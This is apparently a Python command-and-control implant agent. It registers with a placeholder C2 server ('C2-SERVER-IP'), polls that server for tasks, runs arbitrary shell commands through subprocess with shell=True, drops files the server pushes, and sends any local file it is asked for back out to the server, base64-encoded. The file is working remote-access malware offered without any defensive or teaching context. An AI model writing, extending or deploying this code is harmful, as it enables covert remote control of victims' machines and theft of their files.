import time
import requests
import subprocess
import base64
import json
import os

C2_SERVER_IP = "http://C2-SERVER-IP:80"
AUTH_KEY = "MySecretKey123"
POLL_INTERVAL = 2

session = requests.Session()
session.headers.update({"Authorization": f"Bearer {AUTH_KEY}"})


def send_result(agent_id, data):
    try:
        session.post(f"{C2_SERVER_IP}/result/{agent_id}", data=data, timeout=5)
    except Exception as e:
        print(f"Failed to send result: {e}")


while True:
    try:
        r = session.post(f"{C2_SERVER_IP}/register", timeout=5)
        agent_id = r.json()["agent_id"]
        print(f"Registered as: {agent_id}")
        break
    except Exception as e:
        print(f"Registration failed: {e}. Retrying...")
        time.sleep(3)


while True:
    try:
        r = session.get(f"{C2_SERVER_IP}/task/{agent_id}", timeout=5)
        task = r.json().get("task")
    except Exception as e:
        print(f"Polling error: {e}")
        time.sleep(POLL_INTERVAL)
        continue

    if not task:
        time.sleep(POLL_INTERVAL)
        continue

    # handle JSON structured tasks (PUT/GET)
    try:
        parsed = json.loads(task)

        # PUT (server -> agent)
        if parsed.get("type") == "put":
            filename = parsed["filename"]
            data = base64.b64decode(parsed["data"])

            with open(filename, "wb") as f:
                f.write(data)

            send_result(agent_id, f"[PUT] Saved file: {filename}")
            continue

        # GET (agent -> server)
        elif parsed.get("type") == "get":
            path = parsed["path"]

            if not os.path.isfile(path):
                send_result(agent_id, f"[GET ERROR] File not found: {path}")
                continue

            with open(path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()

            payload = json.dumps({
                "type": "file",
                "filename": os.path.basename(path),
                "data": b64
            })

            send_result(agent_id, payload)
            continue

    except json.JSONDecodeError:
        # Not JSON -> treat as normal command
        pass

    # execute command
    try:
        output = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
        output = output.decode()
    except Exception as e:
        output = f"Execution error: {e}"

    send_result(agent_id, output)
    time.sleep(POLL_INTERVAL)
